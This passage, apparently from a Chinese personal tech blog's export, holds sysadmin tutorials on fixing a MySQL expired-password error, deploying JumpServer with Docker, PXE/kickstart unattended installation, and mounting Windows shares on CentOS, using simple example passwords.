class="line">for query in $&#123;ARG[*]&#125;; do</span><br><span class="line">    /usr/bin/find "$&#123;SEARCH&#125;" "$&#123;MATCH&#125;" "*$&#123;ARG&#125;*"</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Shell脚本</tag>
        <tag>everything</tag>
      </tags>
  </entry>
  <entry>
    <title>【mysql】You must reset your password using ALTER USER statement before executing this statement.</title>
    <url>/2019/01/30/%E3%80%90mysql%E3%80%91You-must-reset-your-password-using-ALTER-USER-statement-before-executing-this-statement/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="【mysql】You-must-reset-your-password-using-ALTER-USER-statement-before-executing-this-statement"><a href="#【mysql】You-must-reset-your-password-using-ALTER-USER-statement-before-executing-this-statement" class="headerlink" title="【mysql】You must reset your password using ALTER USER statement before executing this statement."></a>【mysql】You must reset your password using ALTER USER statement before executing this statement.</h1><p>故障现场：登陆到MySQL服务器,不管你执行什么命令都报这个错</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">ERROR 1820 (HY000): You must <span class="keyword">reset</span> your <span class="keyword">password</span> <span class="keyword">using</span> <span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="keyword">statement</span> <span class="keyword">before</span> executing this statement.</span><br><span class="line">mysql&gt; <span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line">ERROR 1820 (HY000): You must <span class="keyword">reset</span> your <span class="keyword">password</span> <span class="keyword">using</span> <span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="keyword">statement</span> <span class="keyword">before</span> executing this statement.</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>怎么会这样呢？难道我进的是假服务器？</p>
<p>原因分析：这个主要是由一个参数控制的 default_password_lifetime,看看官方的解释</p>
<p><img src= "/img/loading.gif" data-src="/2019/01/30/%E3%80%90mysql%E3%80%91You-must-reset-your-password-using-ALTER-USER-statement-before-executing-this-statement/image-20200911174816838.png" alt="image-20200911174816838"></p>
<p>仔细看哈，Note信息有时候比上面的信息有用（英文的note我一般都是忽略的，有可能你忽略掉的那部分对性能也有帮助哦）</p>
<p>问题解决：在开源的世界里，我们不怕报错，有报错才有解决思路。下面来看下自己环境里的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+<span class="comment">--------------+</span></span><br><span class="line">| version()    |</span><br><span class="line">+<span class="comment">--------------+</span></span><br><span class="line">| 5.7.10-3-log |</span><br><span class="line">+<span class="comment">--------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'default_password_lifetime'</span>;</span><br><span class="line">+<span class="comment">---------------------------+-------+</span></span><br><span class="line">| Variable_name             | Value |</span><br><span class="line">+<span class="comment">---------------------------+-------+</span></span><br><span class="line">| default_password_lifetime | 360     |</span><br><span class="line">+<span class="comment">---------------------------+-------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>soga，原来如此。那么就修改密码呗</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="keyword">user</span>() <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">"123456"</span>;</span><br></pre></td></tr></table></figure>

<p>问题得到成功解决！当前用户可以成功执行权限内的命令。</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Docker部署jumpserver堡垒机</title>
    <url>/2020/09/11/%E4%BD%BF%E7%94%A8Docker%E9%83%A8%E7%BD%B2jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="使用Docker部署jumpserver堡垒机"><a href="#使用Docker部署jumpserver堡垒机" class="headerlink" title="使用Docker部署jumpserver堡垒机"></a>使用Docker部署jumpserver堡垒机</h1><p><strong>JumpServer 封装了一个 All in one Docker, 可以快速启动。该镜像集成了所需要的组件, 支持使用外置 Database 和 Redis</strong></p>
<h2 id="Docker-快速部署"><a href="#Docker-快速部署" class="headerlink" title="Docker 快速部署"></a>Docker 快速部署</h2><ul>
<li>使用 root 身份输入</li>
<li>环境迁移和更新升级请检查 SECRET_KEY 是否与之前设置一致, 不能随机生成, 否则数据库所有加密的字段均无法解密</li>
</ul>
<p><strong>Linux 生成随机加密秘钥, 可以用下面的命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ ! "$SECRET_KEY" ]; then</span><br><span class="line">  SECRET_KEY=`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 50`;</span><br><span class="line">  echo "SECRET_KEY=$SECRET_KEY" &gt;&gt; ~/.bashrc;</span><br><span class="line">  echo $SECRET_KEY;</span><br><span class="line">else</span><br><span class="line">  echo $SECRET_KEY;</span><br><span class="line">fi  </span><br><span class="line">if [ ! "$BOOTSTRAP_TOKEN" ]; then</span><br><span class="line">  BOOTSTRAP_TOKEN=`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 16`;</span><br><span class="line">  echo "BOOTSTRAP_TOKEN=$BOOTSTRAP_TOKEN" &gt;&gt; ~/.bashrc;</span><br><span class="line">  echo $BOOTSTRAP_TOKEN;</span><br><span class="line">else</span><br><span class="line">  echo $BOOTSTRAP_TOKEN;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><strong>macOS 生成随机 key 可以用下面的命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ ! "$SECRET_KEY" ]; then</span><br><span class="line">  SECRET_KEY=`LC_CTYPE=C tr -dc A-Za-z0-9 &lt; /dev/urandom | head -c 50`;</span><br><span class="line">  echo "SECRET_KEY=$SECRET_KEY" &gt;&gt; ~/.zshrc;</span><br><span class="line">  echo $SECRET_KEY;</span><br><span class="line">else</span><br><span class="line">  echo $SECRET_KEY;</span><br><span class="line">fi  </span><br><span class="line">if [ ! "$BOOTSTRAP_TOKEN" ]; then</span><br><span class="line">  BOOTSTRAP_TOKEN=`LC_CTYPE=C tr -dc A-Za-z0-9 &lt; /dev/urandom | head -c 16`;</span><br><span class="line">  echo "BOOTSTRAP_TOKEN=$BOOTSTRAP_TOKEN" &gt;&gt; ~/.zshrc;</span><br><span class="line">  echo $BOOTSTRAP_TOKEN;</span><br><span class="line">else</span><br><span class="line">  echo $BOOTSTRAP_TOKEN;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>首先安装并启动docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install docker		#该处使用的是默认安装的docker版本较低，如需高版本，请手动下载更高版本的docker yum源，再进行安装</span><br><span class="line">systemctl start docker		#启动docker</span><br><span class="line">systemctl enable docker		#设置docker开机自启</span><br></pre></td></tr></table></figure>

<p>然后直接运行镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name jms_all -d \</span><br><span class="line">  -p 80:80 -p 2222:2222 \</span><br><span class="line">  -e SECRET_KEY=$SECRET_KEY \</span><br><span class="line">  -e BOOTSTRAP_TOKEN=$BOOTSTRAP_TOKEN \</span><br><span class="line">  -v /opt/jumpserver/data:/opt/jumpserver/data \</span><br><span class="line">  -v /opt/jumpserver/mysql:/var/lib/mysql \</span><br><span class="line">  --privileged=true \</span><br><span class="line">  jumpserver/jms_all:v2.2.2</span><br></pre></td></tr></table></figure>

<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">浏览器访问: http://&lt;容器所在服务器IP&gt;</span><br><span class="line"></span><br><span class="line">SSH 访问: ssh -p 2222 &lt;容器所在服务器IP&gt;</span><br><span class="line"></span><br><span class="line">XShell 等工具请添加 connection 连接, 默认 ssh 端口 2222</span><br><span class="line"></span><br><span class="line">默认管理员账户 admin 密码 admin</span><br></pre></td></tr></table></figure>

<h3 id="外置数据库要求"><a href="#外置数据库要求" class="headerlink" title="外置数据库要求"></a>外置数据库要求</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql 版本需要大于等于 5.6</span><br><span class="line"></span><br><span class="line">mariadb 版本需要大于等于 5.5.6</span><br><span class="line"></span><br><span class="line">数据库编码要求 uft8</span><br></pre></td></tr></table></figure>

<p><strong>创建数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> jumpserver <span class="keyword">default</span> <span class="keyword">charset</span> <span class="string">'utf8'</span> <span class="keyword">collate</span> <span class="string">'utf8_bin'</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> jumpserver.* <span class="keyword">to</span> <span class="string">'jumpserver'</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'weakPassword'</span>;</span><br></pre></td></tr></table></figure>

<p><strong>运行镜像</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name jms_all -d \</span><br><span class="line">  -v /opt/jumpserver/data:/opt/jumpserver/data \</span><br><span class="line">  -p 80:80 \</span><br><span class="line">  -p 2222:2222 \</span><br><span class="line">  -e SECRET_KEY=xxxxxx \</span><br><span class="line">  -e BOOTSTRAP_TOKEN=xxx \</span><br><span class="line">  -e DB_HOST=192.168.x.x \</span><br><span class="line">  -e DB_PORT=3306 \</span><br><span class="line">  -e DB_USER=root \</span><br><span class="line">  -e DB_PASSWORD=xxx \</span><br><span class="line">  -e DB_NAME=jumpserver \</span><br><span class="line">  -e REDIS_HOST=192.168.x.x \</span><br><span class="line">  -e REDIS_PORT=6379 \</span><br><span class="line">  -e REDIS_PASSWORD=xxx \</span><br><span class="line">  --privileged=true \</span><br><span class="line">  jumpserver/jms_all:v2.2.2</span><br><span class="line">  </span><br><span class="line"><span class="meta">  #</span><span class="bash">变量说明</span></span><br><span class="line">  SECRET_KEY = xxxxxx</span><br><span class="line">  BOOTSTRAP_TOKEN = xxxxxx</span><br><span class="line">  DB_HOST = mysql_host</span><br><span class="line">  DB_PORT = 3306</span><br><span class="line">  DB_USER = jumpserver</span><br><span class="line">  DB_PASSWORD = weakPassword</span><br><span class="line">  DB_NAME = jumpserver</span><br><span class="line">  REDIS_HOST = redis_host</span><br><span class="line">  REDIS_PORT = 6379</span><br><span class="line">  REDIS_PASSWORD = weakPassword</span><br><span class="line">  VOLUME /opt/jumpserver/data VOLUME /var/lib/mysql</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>jumpserver</tag>
      </tags>
  </entry>
  <entry>
    <title>使用PXE+kickstart无人值守安装服务</title>
    <url>/2018/11/07/%E4%BD%BF%E7%94%A8PXE+kickstart%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​    使用光盘镜像来安装Linux系统的方法，该方法适用于只安装少量Linux系统的情况。如果生产环境中有数百台服务器都需要安装系统，这种方式就不合时宜了。这时，我们就需要使用PXE + TFTP +HTTP + DHCP + Kickstart服务搭建出一个无人值守安装系统。这种无人值守安装系统可以自动地为数十台服务器安装系统，这一方面将运维人员从重复性的工作中解救出来，也大大提升了系统安装的效率。</p>
<p>​       PXE（Preboot eXecute Environment，预启动执行环境）是由Intel公司开发的技术，可以让计算机通过网络来启动操作系统（前提是计算机上安装的网卡支持PXE技术），主要用于在无人值守安装系统中引导客户端主机安装Linux操作系统。Kickstart是一种无人值守的安装方式，其工作原理是预先把原本需要运维人员手工填写的参数保存成一个ks.cfg文件，当安装过程中需要填写参数时则自动匹配Kickstart生成的文件。所以只要Kickstart文件包含了安装过程中需要人工填写的所有参数，那么从理论上来讲完全不需要运维人员的干预。</p>
<p><strong>所需配置服务及安装包</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DHCP        #获取IP地址,并提供pxelinux.0文件位置</span><br><span class="line">TFTP            #支持PXE下载内核引导文件</span><br><span class="line">HTTP        #下载ks.cfg以及系统镜像文件</span><br><span class="line">Syslinux        #提供引导文件</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl stop firewalld <span class="comment">#关闭防火墙selinux</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> setenforce 0</span></span><br></pre></td></tr></table></figure>

<p><strong>配置DHCP服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum -y install dhcp</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/dhcp/dhcpd.conf</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">subnet 192.168.91.0 netmask 255.255.255.0 &#123;</span><br><span class="line">range 192.168.91.100 192.168.91.199;</span><br><span class="line">option subnet-mask 255.255.255.0;</span><br><span class="line">default-lease-time 21600;</span><br><span class="line">max-lease-time 43200;</span><br><span class="line">next-server 192.168.91.140;</span><br><span class="line">filename "/pxelinux.0";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#启动dhcp服务</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl start dhcpd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#开机自启动</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">enable</span> dhcpd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#查看有无端口</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> netstat -lntup|grep dhcpd</span></span><br></pre></td></tr></table></figure>

<p><strong>配置TFTP服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install tftp-server</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/xinetd.d/tftp</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service tftp</span><br><span class="line">&#123;</span><br><span class="line">        socket_type             = dgram</span><br><span class="line">        protocol                = udp</span><br><span class="line">        wait                    = yes</span><br><span class="line">        user                    = root</span><br><span class="line">        server                  = /usr/sbin/in.tftpd</span><br><span class="line">        server_args             = -s /var/lib/tftpboot</span><br><span class="line">        disable                 = no   #此处由yes 改为no</span><br><span class="line">        per_source              = 11</span><br><span class="line">        cps                     = 100 2</span><br><span class="line">        flags                   = IPv4</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl restart tftp &amp;&amp; systemctl <span class="built_in">enable</span> tftp</span></span><br></pre></td></tr></table></figure>

<p><strong>配置HTTP服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl start httpd &amp;&amp; systemctl <span class="built_in">enable</span> httpd</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#创建挂载点</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir –p /media/cdrom</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#挂载CentOS7光盘</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mount /dev/cdrom /media/cdrom</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir -p /var/www/html/centos/7/x86_64</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#绑定挂载到http默认目录下</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mount --<span class="built_in">bind</span> /media/cdrom /var/www/html/centos/7/x86_64</span></span><br><span class="line"></span><br><span class="line">使用浏览器访问，进行测试。</span><br></pre></td></tr></table></figure>

<p><strong>配置SYSLinux服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install syslinux</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /var/lib/tftpboot</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp /usr/share/syslinux/pxelinux.0 .</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp /media/cdrom/images/pxeboot/&#123;vmlinuz,initrd.img&#125; .</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp /media/cdrom/isolinux/&#123;vesamenu.c32,boot.msg&#125; .</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir pxelinux.cfg</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp /media/cdrom/isolinux/isolinux.cfg pxelinux.cfg/default</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim pxelinux.cfg/default #修改内容与行数如下</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1  default linux</span><br><span class="line">64 append initrd=initrd.img inst.stage2=ftp://192.168.10.10 ks=ftp://192.168.10.10/pub/ks.cfg quiet</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#开机自启动</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">enable</span> tftp</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#启动tftp</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl start tftp</span></span><br></pre></td></tr></table></figure>

<p><strong>配置kickstart的 ks.cfg文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> mkdir /var/www/html/ks</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /var/www/html/ks/ks.cfg</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">Kickstart Configurator <span class="keyword">for</span> CentOS 7 by Mine</span></span><br><span class="line"><span class="meta">#</span><span class="bash">version=DEVEL</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> System authorization information</span></span><br><span class="line">auth --enableshadow --passalgo=sha512</span><br><span class="line"><span class="meta">#</span><span class="bash"> Use CDROM installation media</span></span><br><span class="line"><span class="meta">#</span><span class="bash">cdrom</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install OS instead of upgrade</span></span><br><span class="line">install</span><br><span class="line"><span class="meta">#</span><span class="bash"> Use network installation</span></span><br><span class="line">url --url=http://10.0.0.61/centos/7/x86_64</span><br><span class="line"><span class="meta">#</span><span class="bash"> Use graphical install</span></span><br><span class="line">graphical</span><br><span class="line"><span class="meta">#</span><span class="bash"> Run the Setup Agent on first boot</span></span><br><span class="line">firstboot --enable</span><br><span class="line"><span class="meta">#</span><span class="bash">ignoredisk --only-use=sda</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Keyboard layouts</span></span><br><span class="line">keyboard --vckeymap=cn --xlayouts='cn'</span><br><span class="line"><span class="meta">#</span><span class="bash"> System language</span></span><br><span class="line">lang zh_CN.UTF-8</span><br><span class="line"><span class="meta">#</span><span class="bash"> Network information</span></span><br><span class="line"><span class="meta">#</span><span class="bash">network  --bootproto=static --device=eth0 --gateway=10.0.0.254 --ip=10.0.0.100 --nameserver=223.5.5.5 --netmask=255.255.255.0 --activate </span></span><br><span class="line"><span class="meta">#</span><span class="bash">network  --bootproto=static --device=eth1 --ip=172.16.1.100 --netmask=255.255.255.0 --activate</span></span><br><span class="line">network  --bootproto=dhcp --device=eth0 --onboot=off --ipv6=auto</span><br><span class="line">network  --hostname=hostname</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Root password</span></span><br><span class="line">rootpw --iscrypted $1$$GmbL3iXOMZR57QuGDLv.L1</span><br><span class="line"><span class="meta">#</span><span class="bash">perl -e <span class="string">'print crypt("123",q($1$)),"\n"'</span> 使用的密码为123 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> System timezone</span></span><br><span class="line">timezone Asia/Shanghai --isUtc</span><br><span class="line"><span class="meta">#</span><span class="bash"> System bootloader configuration</span></span><br><span class="line">bootloader --append=" crashkernel=auto" --location=mbr --boot-drive=sda</span><br><span class="line">autopart --type=lvm</span><br><span class="line"><span class="meta">#</span><span class="bash"> Partition clearing information</span></span><br><span class="line">clearpart --none --initlabel</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">packages</span></span><br><span class="line">@^minimal</span><br><span class="line">@core</span><br><span class="line">kexec-tools</span><br><span class="line">vim</span><br><span class="line">wget</span><br><span class="line">httpd</span><br><span class="line"><span class="meta">%</span><span class="bash">end</span></span><br><span class="line"><span class="meta">%</span><span class="bash">addon com_redhat_kdump --<span class="built_in">enable</span> --reserve-mb=<span class="string">'auto'</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash">end</span></span><br><span class="line">selinux --disabled</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>失败原因：</p>
<p>IP地址、路径错误</p>
<p>虚拟机内存不足</p>
<p>服务未启动</p>
]]></content>
      <categories>
        <category>PXE</category>
      </categories>
      <tags>
        <tag>PXE</tag>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>挂载Windows文件夹到Linux</title>
    <url>/2020/09/08/%E4%BD%BF%E7%94%A8mount%E5%AE%9E%E7%8E%B0linux%E4%B8%8Ewindows%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Windows操作"><a href="#Windows操作" class="headerlink" title="Windows操作"></a>Windows操作</h2><p>写在前面，是客户公司的服务器，无法连接外网，也不让插U盘</p>
<h3 id="磁盘共享"><a href="#磁盘共享" class="headerlink" title="磁盘共享"></a>磁盘共享</h3><p><strong>配置D:\services\pic，D:\aaa</strong></p>
<h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost /]# mkdir -p /usr/local/services/pic/</span><br><span class="line">[root@localhost /]# mkdir -p /usr/local/services/aaa/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 挂载，注意这里用户名user，密码pass要改成实际环境的用户名和密码</span></span><br><span class="line">[root@localhost /]# mount.cifs //62.177.28.126/pic /usr/local/services/pic/ -o user=test,pass=123321</span><br><span class="line">[root@localhost /]# mount.cifs //62.177.28.126/aaa /usr/local/services/aaa/ -o user=test,pass=123321</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看文件测试</span></span><br><span class="line">[root@localhost yum.repos.d]# ll /usr/local/services/pic</span><br><span class="line">total 0</span><br><span class="line">-rwxr-xr-x. 1 root root 0 Sep  7 07:34 1.jpg</span><br><span class="line">-rwxr-xr-x. 1 root root 0 Sep  7 07:33 1.txt</span><br><span class="line">drwxr-xr-x. 2 root root 0 Sep  7 07:33 文件夹测试</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写入测试</span></span><br><span class="line">[root@localhost yum.repos.d]# cd /usr/local/services/pic/</span><br><span class="line">[root@localhost pic]# touch 2.jpg</span><br><span class="line">[root@localhost pic]# mkdir 文件夹测试2</span><br><span class="line">[root@localhost pic]# ll</span><br><span class="line">total 0</span><br><span class="line">-rwxr-xr-x. 1 root root 0 Sep  7 07:34 1.jpg</span><br><span class="line">-rwxr-xr-x. 1 root root 0 Sep  7 07:33 1.txt</span><br><span class="line">-rwxr-xr-x. 1 root root 0 Sep  7 15:37 2.jpg</span><br><span class="line">drwxr-xr-x. 2 root root 0 Sep  7 07:33 文件夹测试</span><br><span class="line">drwxr-xr-x. 2 root root 0 Sep  7 07:37 文件夹测试2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果提示 -bash: mount.cifs: <span class="built_in">command</span> not found</span></span><br><span class="line">[root@localhost /]# yum install cifs* -y</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果这里yum不能使用。则挂载系统镜像</span></span><br></pre></td></tr></table></figure>

<h3 id="挂载系统镜像"><a href="#挂载系统镜像" class="headerlink" title="挂载系统镜像"></a>挂载系统镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 首先确认系统发行版本，注意上传镜像的版本。</span></span><br><span class="line">[root@localhost ~]# cat /etc/issue</span><br><span class="line">CentOS release 6.10 (Final)</span><br><span class="line">Kernel \r on an \m</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# cd /opt/</span><br><span class="line">[root@localhost opt]# mkdir iso</span><br><span class="line">[root@localhost opt]# cd iso/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 上传系统镜像文件 CentOS-6.10-x86_64-bin-DVD1.iso 至 iso文件夹</span></span><br><span class="line"></span><br><span class="line">[root@localhost iso]# cd /etc/yum.repos.d/</span><br><span class="line">[root@localhost yum.repos.d]# mv CentOS-Base.repo CentOS-Base.repo.bak</span><br><span class="line">[root@localhost yum.repos.d]# mv CentOS-fasttrack.repo CentOS-fasttrack.repo.bak</span><br><span class="line">[root@localhost yum.repos.d]# mv CentOS-Vault.repo CentOS-Vault.repo.bak</span><br><span class="line">[root@localhost yum.repos.d]# mv CentOS-Debuginfo.repo CentOS-Debuginfo.repo.bak</span><br><span class="line">[root@localhost yum.repos.d]# mv CentOS-Media.repo CentOS-Media.repo.bak</span><br><span class="line">[root@localhost yum.repos.d]# ls</span><br><span class="line">CentOS-Base.repo.bak       CentOS-fasttrack.repo.bak  CentOS-Vault.repo.bak</span><br><span class="line">CentOS-Debuginfo.repo.bak  CentOS-Media.repo.bak</span><br><span class="line"></span><br><span class="line">[root@localhost yum.repos.d]# vim my.repo</span><br><span class="line"></span><br><span class="line">[jtkj]</span><br><span class="line">name=jtkj_yc</span><br><span class="line">baseurl=file:///mnt/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[root@localhost yum.repos.d]# mount /opt/iso/CentOS-6.10-x86_64-bin-DVD1.iso /mnt -o loop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost yum.repos.d]# yum install cifs* -y</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>使用samba完成linux与windows文件共享</title>
    <url>/2020/09/08/%E4%BD%BF%E7%94%A8samba%E5%AE%8C%E6%88%90linux%E4%B8%8Ewindows%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="使用samba完成linux与windows文件共享"><a href="#使用samba完成linux与windows文件共享" class="headerlink" title="使用samba完成linux与windows文件共享"></a>使用samba完成linux与windows文件共享</h1><p>这里以VMWARE与主控真机来做实现实现</p>
<p>由于SMB在centos中自带，所以，无需像网上说的样子，要这删除，那卸载，直接搜索是否存在SAMBA的安装文件</p>
<h2 id="一-查询包是否存在"><a href="#一-查询包是否存在" class="headerlink" title="一 查询包是否存在"></a>一 查询包是否存在</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# rpm -qa|grep samba</span><br><span class="line">samba-client-libs-4.4.4-9.el7.x86_64</span><br><span class="line">samba-common-libs-4.4.4-9.el7.x86_64</span><br><span class="line">samba-client-4.4.4-9.el7.x86_64</span><br><span class="line">samba-common-4.4.4-9.el7.noarch</span><br></pre></td></tr></table></figure>



